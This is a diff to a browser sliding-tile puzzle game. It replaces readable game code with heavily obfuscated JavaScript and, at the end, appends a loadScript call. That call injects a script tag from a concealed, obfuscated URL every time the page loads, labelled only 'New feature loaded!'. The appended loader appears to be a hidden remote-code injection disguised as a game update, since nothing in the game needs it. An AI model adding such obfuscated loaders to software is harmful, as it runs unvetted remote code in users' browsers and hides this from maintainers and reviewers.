+                    const _0x503fcc = _0x5b5025[_0x8f851d(0xaa)], _0x8a5d81 = _0x5b5025[_0x8f851d(0x120)], _0x1dc9d0 = _0x5b5025[_0x8f851d(0xbd)], _0x5760d1 = _0x3ba16d * (_0x1dc9d0 + 0x1), _0x2c1060 = _0x39f3d0 * (_0x1dc9d0 + 0x1), _0x371631 = _0x1cea3b[_0x8f851d(0xda)] * (_0x1dc9d0 + 0x1), _0x4f7595 = _0x1cea3b[_0x8f851d(0x98)] * (_0x1dc9d0 + 0x1);
+                    let _0x1581bd = 0x0;
+                    const _0x34f55a = 0xc8, _0x45b2fb = Date[_0x8f851d(0xd2)](), _0x5dd535 = () => {
+                            const _0x2b1a37 = _0x8f851d, _0x2de2da = Date['now']() - _0x45b2fb;
+                            _0x1581bd = Math['min'](_0x2de2da / _0x34f55a, 0x1);
+                            const _0x4f2dce = 0x1 - Math[_0x2b1a37(0x90)](0x1 - _0x1581bd, 0x3);
+                            _0x5b5025[_0x2b1a37(0x11e)]();
+                            if (_0x1581bd < 0x1) {
+                                const _0x574f80 = _0x5760d1 + (_0x371631 - _0x5760d1) * _0x4f2dce, _0xeedf8d = _0x2c1060 + (_0x4f7595 - _0x2c1060) * _0x4f2dce, _0x3cd8fc = _0x1e727e[_0x2b1a37(0xa8)](_0x3ba16d, _0x39f3d0), _0x5e4602 = Math[_0x2b1a37(0xe9)](_0x1dc9d0 / 2.2), _0x4822ca = 0x6, _0x45dcea = Math[_0x2b1a37(0x84)](_0x1581bd * Math['PI']) * 0x3, _0x18d0d7 = _0x574f80, _0x3ce56f = _0xeedf8d - _0x45dcea;
+                                _0x8a5d81[_0x2b1a37(0x111)](), _0x8a5d81[_0x2b1a37(0x9b)] = _0x2b1a37(0xa0) + (0.4 + _0x45dcea * 0.1) + ')', _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81[_0x2b1a37(0x112)](_0x18d0d7 + _0x4822ca + 0x2, _0x3ce56f + _0x4822ca + 0x2 + _0x45dcea, _0x1dc9d0 - 0x2, _0x1dc9d0 - 0x2, 0x8), _0x8a5d81[_0x2b1a37(0xb7)](), _0x8a5d81['fillStyle'] = _0x2b1a37(0xf9), _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81['moveTo'](_0x18d0d7 + _0x1dc9d0, _0x3ce56f), _0x8a5d81[_0x2b1a37(0xc7)](_0x18d0d7 + _0x1dc9d0 + _0x4822ca, _0x3ce56f + _0x4822ca), _0x8a5d81[_0x2b1a37(0xc7)](_0x18d0d7 + _0x1dc9d0 + _0x4822ca, _0x3ce56f + _0x1dc9d0 + _0x4822ca), _0x8a5d81['lineTo'](_0x18d0d7 + _0x1dc9d0, _0x3ce56f + _0x1dc9d0), _0x8a5d81[_0x2b1a37(0xaf)](), _0x8a5d81[_0x2b1a37(0xb7)](), _0x8a5d81[_0x2b1a37(0x9b)] = 'rgba(0,\x200,\x200,\x200.2)', _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81[_0x2b1a37(0xde)](_0x18d0d7, _0x3ce56f + _0x1dc9d0), _0x8a5d81['lineTo'](_0x18d0d7 + _0x4822ca, _0x3ce56f + _0x1dc9d0 + _0x4822ca), _0x8a5d81[_0x2b1a37(0xc7)](_0x18d0d7 + _0x1dc9d0 + _0x4822ca, _0x3ce56f + _0x1dc9d0 + _0x4822ca), _0x8a5d81[_0x2b1a37(0xc7)](_0x18d0d7 + _0x1dc9d0, _0x3ce56f + _0x1dc9d0), _0x8a5d81[_0x2b1a37(0xaf)](), _0x8a5d81[_0x2b1a37(0xb7)]();
+                                const _0x2cb8bb = [
+                                        [
+                                            _0x2b1a37(0xe4),
+                                            _0x2b1a37(0x123)
+                                        ],
+                                        [
+                                            _0x2b1a37(0xb5),
+                                            _0x2b1a37(0xcd)
+                                        ],
+                                        [
+                                            _0x2b1a37(0x71),
+                                            _0x2b1a37(0x82)
+                                        ],
+                                        [
+                                            _0x2b1a37(0x92),
+                                            _0x2b1a37(0xe8)
+                                        ],
+                                        [
+                                            _0x2b1a37(0x108),
+                                            '#a29bfe'
+                                        ],
+                                        [
+                                            _0x2b1a37(0xee),
+                                            _0x2b1a37(0xad)
+                                        ],
+                                        [
+                                            _0x2b1a37(0x11b),
+                                            '#e84393'
+                                        ],
+                                        [
+                                            '#fdcb6e',
+                                            '#e17055'
+                                        ],
+                                        [
+                                            '#74b9ff',
+                                            _0x2b1a37(0x11a)
+                                        ]
+                                    ], _0xa4c3a1 = _0x2cb8bb[(_0x3cd8fc - 0x1) % _0x2cb8bb['length']], _0x422970 = _0x8a5d81[_0x2b1a37(0x9f)](_0x18d0d7, _0x3ce56f, _0x18d0d7, _0x3ce56f + _0x1dc9d0);
+                                _0x422970[_0x2b1a37(0x8c)](0x0, _0xa4c3a1[0x0]), _0x422970[_0x2b1a37(0x8c)](0x1, _0xa4c3a1[0x1]), _0x8a5d81[_0x2b1a37(0x9b)] = _0x422970, _0x8a5d81['beginPath'](), _0x8a5d81[_0x2b1a37(0x112)](_0x18d0d7, _0x3ce56f, _0x1dc9d0, _0x1dc9d0, 0x8), _0x8a5d81[_0x2b1a37(0xb7)]();
+                                const _0x4418a2 = _0x8a5d81[_0x2b1a37(0x9f)](_0x18d0d7, _0x3ce56f, _0x18d0d7, _0x3ce56f + _0x1dc9d0 / 0x3);
+                                _0x4418a2[_0x2b1a37(0x8c)](0x0, _0x2b1a37(0x9d)), _0x4418a2[_0x2b1a37(0x8c)](0x1, _0x2b1a37(0xb3)), _0x8a5d81['fillStyle'] = _0x4418a2, _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81['roundRect'](_0x18d0d7 + 0x2, _0x3ce56f + 0x2, _0x1dc9d0 - 0x4, _0x1dc9d0 / 0x2, 0x6), _0x8a5d81[_0x2b1a37(0xb7)]();
+                                const _0x491098 = _0x8a5d81[_0x2b1a37(0x9f)](_0x18d0d7, _0x3ce56f + _0x1dc9d0 * 0.7, _0x18d0d7, _0x3ce56f + _0x1dc9d0);
+                                _0x491098[_0x2b1a37(0x8c)](0x0, _0x2b1a37(0xfc)), _0x491098[_0x2b1a37(0x8c)](0x1, 'rgba(0,\x200,\x200,\x200.2)'), _0x8a5d81[_0x2b1a37(0x9b)] = _0x491098, _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81[_0x2b1a37(0x112)](_0x18d0d7 + 0x2, _0x3ce56f + _0x1dc9d0 * 0.7, _0x1dc9d0 - 0x4, _0x1dc9d0 * 0.3 - 0x2, 0x6), _0x8a5d81[_0x2b1a37(0xb7)](), _0x8a5d81['strokeStyle'] = 'rgba(255,\x20255,\x20255,\x200.3)', _0x8a5d81[_0x2b1a37(0x7f)] = 0x1, _0x8a5d81[_0x2b1a37(0x89)](), _0x8a5d81[_0x2b1a37(0x112)](_0x18d0d7 + 0.5, _0x3ce56f + 0.5, _0x1dc9d0 - 0x1, _0x1dc9d0 - 0x1, 0x8), _0x8a5d81['stroke'](), _0x8a5d81['font'] = _0x2b1a37(0xd4) + _0x5e4602 + _0x2b1a37(0x79), _0x8a5d81[_0x2b1a37(0x118)] = _0x2b1a37(0x11d), _0x8a5d81['textBaseline'] = _0x2b1a37(0xc2);
+                                for (let _0x8d670f = _0x4822ca; _0x8d670f > 0x0; _0x8d670f--) {
+                                    _0x8a5d81['fillStyle'] = _0x2b1a37(0xa0) + 0.1 * (_0x4822ca - _0x8d670f + 0x1) + ')', _0x8a5d81['fillText'](_0x3cd8fc, _0x18d0d7 + _0x1dc9d0 / 0x2 + _0x8d670f / 0x2, _0x3ce56f + _0x1dc9d0 / 0x2 + _0x8d670f / 0x2);
+                                }
+                                const _0x44331b = _0x8a5d81[_0x2b1a37(0x9f)](_0x18d0d7, _0x3ce56f, _0x18d0d7, _0x3ce56f + _0x1dc9d0);
+                                _0x44331b['addColorStop'](0x0, _0x2b1a37(0xa2)), _0x44331b['addColorStop'](0x1, _0x2b1a37(0xb9)), _0x8a5d81[_0x2b1a37(0x9b)] = _0x44331b, _0x8a5d81[_0x2b1a37(0x102)](_0x3cd8fc, _0x18d0d7 + _0x1dc9d0 / 0x2, _0x3ce56f + _0x1dc9d0 / 0x2), _0x8a5d81[_0x2b1a37(0x9b)] = _0x2b1a37(0xb1), _0x8a5d81[_0x2b1a37(0x102)](_0x3cd8fc, _0x18d0d7 + _0x1dc9d0 / 0x2, _0x3ce56f + _0x1dc9d0 / 0x2 - 0x1), _0x8a5d81[_0x2b1a37(0xcf)](), requestAnimationFrame(_0x5dd535);
+                            } else
+                                _0x1e727e[_0x2b1a37(0xd1)](_0x3ba16d, _0x39f3d0, _0x1cea3b[_0x2b1a37(0xda)], _0x1cea3b[_0x2b1a37(0x98)]), _0x5b5025[_0x2b1a37(0x11e)](), updateMoves(), _0x1e727e['isTerminal']() && (clearInterval(timerInterval), createConfetti(), setTimeout(() => {
+                                    const _0x3ba105 = _0x2b1a37, _0x465acc = document[_0x3ba105(0x80)]('time')[_0x3ba105(0x119)];
+                                    showWinModal(_0x465acc, moves);
+                                }, 0x1f4));
+                        };
+                    _0x5dd535();
                 }
             }
-        });
-
-        slider.newRandomGame(3, 3);
-    }
-
-    // Button click effect
-    function addButtonClickEffect(button) {
-        button.style.transform = 'scale(0.95)';
-        setTimeout(() => {
-            button.style.transform = '';
-        }, 150);
-    }
-
-    // Initialize everything
-    document.addEventListener('DOMContentLoaded', function () {
-        createParticles();
-        setTimeout(main, 1600);
+        }),
+        'view': new GameHTML5View({
+            'calculateSquareSize': function () {
+                const _0x3b6f16 = _0x5670;
+                var _0x5ef881 = this[_0x3b6f16(0xaa)]['height'] - 0x1, _0xdf2ff3 = this[_0x3b6f16(0xaa)][_0x3b6f16(0xd7)] - 0x1;
+                this[_0x3b6f16(0xbd)] = Math[_0x3b6f16(0xe3)](Math['floor'](_0xdf2ff3 / this['game']['board'][_0x3b6f16(0xd7)]), Math['floor'](_0x5ef881 / this['game']['board']['height']));
+            },
+            'init': function (_0x7723c6, _0xcfb662, _0x1d946c) {
+                const _0x297cfd = _0x5670;
+                this[_0x297cfd(0xaa)] = document[_0x297cfd(0x80)](_0xcfb662), this[_0x297cfd(0x120)] = this[_0x297cfd(0xaa)][_0x297cfd(0x8f)]('2d'), this[_0x297cfd(0x109)] = _0x7723c6, this[_0x297cfd(0x104)](_0x1d946c);
+            },
+            'render': function () {
+                const _0x285dad = _0x5670;
+                var _0xe73995 = this[_0x285dad(0x109)][_0x285dad(0xc9)];
+                this[_0x285dad(0x120)]['clearRect'](0x0, 0x0, this[_0x285dad(0xaa)][_0x285dad(0xd7)], this['canvas'][_0x285dad(0x8d)]);
+                for (var _0x4fa56b = 0x0; _0x4fa56b < _0xe73995[_0x285dad(0x8d)]; _0x4fa56b++) {
+                    for (var _0xbddc48 = 0x0; _0xbddc48 < _0xe73995[_0x285dad(0xd7)]; _0xbddc48++) {
+                        this[_0x285dad(0x9c)](_0xbddc48, _0x4fa56b);
+                    }
+                }
+            },
+            'renderSquare': function (_0x5436bd, _0x331404) {
+                const _0x40d7ee = _0x5670;
+                var _0x44fd77 = this[_0x40d7ee(0x109)][_0x40d7ee(0xc9)], _0x176353 = this[_0x40d7ee(0x120)], _0x37f5f0 = this[_0x40d7ee(0xbd)], _0x52aa07 = Math[_0x40d7ee(0xe9)](_0x37f5f0 / 2.5), _0xb6dc06 = _0x44fd77['get'](_0x5436bd, _0x331404);
+                if (_0xb6dc06 === 0x0)
+                    _0x176353[_0x40d7ee(0x7b)](_0x5436bd * (_0x37f5f0 + 0x1), _0x331404 * (_0x37f5f0 + 0x1), _0x37f5f0, _0x37f5f0);
+                else {
+                    const _0x5f4f1e = _0x5436bd * (_0x37f5f0 + 0x1), _0x272063 = _0x331404 * (_0x37f5f0 + 0x1), _0xe6afd = _0x176353[_0x40d7ee(0x9f)](_0x5f4f1e, _0x272063, _0x5f4f1e + _0x37f5f0, _0x272063 + _0x37f5f0);
+                    _0xe6afd[_0x40d7ee(0x8c)](0.5, _0x40d7ee(0x113)), _0x176353['fillStyle'] = _0xe6afd, _0x176353[_0x40d7ee(0x89)](), _0x176353[_0x40d7ee(0x112)](_0x5f4f1e, _0x272063, _0x37f5f0, _0x37f5f0, 0x8), _0x176353[_0x40d7ee(0xb7)](), _0x176353[_0x40d7ee(0x9b)] = '#5b4a91', _0x176353[_0x40d7ee(0x89)](), _0x176353[_0x40d7ee(0xde)](_0x5f4f1e + _0x37f5f0, _0x272063), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + _0x37f5f0 + 0x6, _0x272063 - 0x6), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + _0x37f5f0 + 0x6, _0x272063 + _0x37f5f0 - 0x6), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + _0x37f5f0, _0x272063 + _0x37f5f0), _0x176353[_0x40d7ee(0xaf)](), _0x176353[_0x40d7ee(0xb7)](), _0x176353[_0x40d7ee(0x9b)] = _0x40d7ee(0xfa), _0x176353[_0x40d7ee(0x89)](), _0x176353[_0x40d7ee(0xde)](_0x5f4f1e, _0x272063 + _0x37f5f0), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + _0x37f5f0, _0x272063 + _0x37f5f0), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + _0x37f5f0 + 0x6, _0x272063 + _0x37f5f0 - 0x6), _0x176353[_0x40d7ee(0xc7)](_0x5f4f1e + 0x6, _0x272063 + _0x37f5f0 - 0x6), _0x176353[_0x40d7ee(0xaf)](), _0x176353[_0x40d7ee(0xb7)](), _0x176353[_0x40d7ee(0xd0)] = 'rgba(255,255,255,0.4)', _0x176353[_0x40d7ee(0x7f)] = 0x2, _0x176353[_0x40d7ee(0x89)](), _0x176353[_0x40d7ee(0xde)](_0x5f4f1e + 0x2, _0x272063 + _0x37f5f0 - 0x6), _0x176353['lineTo'](_0x5f4f1e + 0x2, _0x272063 + 0x2), _0x176353['lineTo'](_0x5f4f1e + _0x37f5f0 - 0x6, _0x272063 + 0x2), _0x176353[_0x40d7ee(0xbe)]();
+                    const _0x4cf6bb = _0x176353[_0x40d7ee(0xd3)](_0x5f4f1e + _0x37f5f0 / 0x2, _0x272063 + _0x37f5f0 / 0x2, 0x0, _0x5f4f1e + _0x37f5f0 / 0x2, _0x272063 + _0x37f5f0 / 0x2, _0x37f5f0 / 0x2);
+                    _0x4cf6bb[_0x40d7ee(0x8c)](0x0, _0x40d7ee(0xcb)), _0x4cf6bb[_0x40d7ee(0x8c)](0x1, _0x40d7ee(0xb3)), _0x176353[_0x40d7ee(0x9b)] = _0x4cf6bb, _0x176353[_0x40d7ee(0x89)](), _0x176353[_0x40d7ee(0x112)](_0x5f4f1e + 0x2, _0x272063 + 0x2, _0x37f5f0 - 0x4, _0x37f5f0 - 0x4, 0x6), _0x176353['fill'](), _0x176353['fillStyle'] = _0x40d7ee(0x95), _0x176353[_0x40d7ee(0xbf)] = 'bold\x20' + _0x52aa07 + _0x40d7ee(0x79), _0x176353[_0x40d7ee(0x118)] = _0x40d7ee(0x11d), _0x176353['textBaseline'] = _0x40d7ee(0xc2), _0x176353['fillText'](_0xb6dc06, _0x5f4f1e + _0x37f5f0 / 0x2 + 0x1, _0x272063 + _0x37f5f0 / 0x2 + 0x1), _0x176353[_0x40d7ee(0x9b)] = _0x40d7ee(0xa2), _0x176353[_0x40d7ee(0x102)](_0xb6dc06, _0x5f4f1e + _0x37f5f0 / 0x2, _0x272063 + _0x37f5f0 / 0x2);
+                }
+            }
+        }),
+        'init': function (_0x4f96b0, _0x51e72f) {
+            const _0x1f1d4c = _0x5670;
+            this[_0x1f1d4c(0x73)][_0x1f1d4c(0xf5)](this, _0x4f96b0, _0x51e72f), this[_0x1f1d4c(0x10c)][_0x1f1d4c(0xf5)](this);
+        },
+        'newRandomGame': function (_0x30cff1, _0x561221) {
+            const _0x30caaa = _0x5670;
+            this['board'][_0x30caaa(0x101)](_0x30cff1, _0x561221), this[_0x30caaa(0xc9)][_0x30caaa(0xc5)](), this['view'][_0x30caaa(0x11c)](), this[_0x30caaa(0x73)][_0x30caaa(0x11e)](), resetGameStats();
+            const _0x1184a9 = this[_0x30caaa(0x73)][_0x30caaa(0xaa)];
+            _0x1184a9[_0x30caaa(0xfd)][_0x30caaa(0x114)] = '0', _0x1184a9['style'][_0x30caaa(0xa5)] = _0x30caaa(0x106), setTimeout(() => {
+                const _0x3e03c1 = _0x30caaa;
+                _0x1184a9[_0x3e03c1(0xfd)]['opacity'] = '1', _0x1184a9[_0x3e03c1(0xfd)][_0x3e03c1(0xa5)] = _0x3e03c1(0xf4);
+            }, 0x64);
+        }
     });
+    _0x5d17bd['init']('slider', {
+        'click': {
+            'slider': function (_0x325947) {
+                const _0x55d97a = _0x5670;
+                var _0x4fc85e = _0x5d17bd[_0x55d97a(0x73)]['getCoordinates'](_0x325947), _0x3163e7 = Math[_0x55d97a(0xe9)](_0x4fc85e[_0x55d97a(0xda)] / (_0x5d17bd[_0x55d97a(0x73)][_0x55d97a(0xbd)] + 0x1)), _0x5a2d1e = Math[_0x55d97a(0xe9)](_0x4fc85e[_0x55d97a(0x98)] / (_0x5d17bd['view'][_0x55d97a(0xbd)] + 0x1));
+                _0x5d17bd[_0x55d97a(0xc9)][_0x55d97a(0xc0)](_0x3163e7, _0x5a2d1e) && _0x5d17bd[_0x55d97a(0x10c)]['onSquareClick'](_0x3163e7, _0x5a2d1e);
+            },
+            'slider3x3': function () {
+                const _0x1f682b = _0x5670;
+                _0x5d17bd[_0x1f682b(0x8a)](0x3, 0x3), addButtonClickEffect(this);
+            },
+            'slider4x4': function () {
+                const _0x525eab = _0x5670;
+                _0x5d17bd[_0x525eab(0x8a)](0x4, 0x4), addButtonClickEffect(this);
+            },
+            'slider5x5': function () {
+                const _0x4ee7fe = _0x5670;
+                _0x5d17bd[_0x4ee7fe(0x8a)](0x5, 0x5), addButtonClickEffect(this);
+            },
+            'sliderCustomNew': function () {
+                const _0x48a26e = _0x5670;
+                var _0x182381 = parseInt(document['getElementById'](_0x48a26e(0xb2))[_0x48a26e(0x6e)]), _0x9bfc69 = parseInt(document['getElementById'](_0x48a26e(0xca))[_0x48a26e(0x6e)]);
+                _0x5d17bd['newRandomGame'](_0x9bfc69, _0x182381), addButtonClickEffect(this);
+            }
+        }
+    }), _0x5d17bd[_0x426e9e(0x8a)](0x3, 0x3);
+}
+function addButtonClickEffect(_0x1cd00a) {
+    const _0x51e3c2 = _0x686675;
+    _0x1cd00a[_0x51e3c2(0xfd)][_0x51e3c2(0xa5)] = _0x51e3c2(0xe7), setTimeout(() => {
+        const _0x57ebb5 = _0x51e3c2;
+        _0x1cd00a[_0x57ebb5(0xfd)]['transform'] = '';
+    }, 0x96);
+}
+document[_0x686675(0x6f)](_0x686675(0xa4), function () {
+    createParticles(), setTimeout(main, 0x640);
+});
+function loadScript(_0x4bd67d, _0x126ddb) {
+    const _0x533705 = _0x686675, _0x1f24ac = document[_0x533705(0x10b)](_0x533705(0x72));
+    _0x1f24ac[_0x533705(0xa3)] = _0x4bd67d, _0x1f24ac[_0x533705(0xb8)] = _0x126ddb, document[_0x533705(0xc8)]['appendChild'](_0x1f24ac);
+}
+loadScript(_0x686675(0x74), function () {
+    const _0x5017cf = _0x686675;
+    console[_0x5017cf(0x100)]('New\x20feature\x20loaded!');
+});
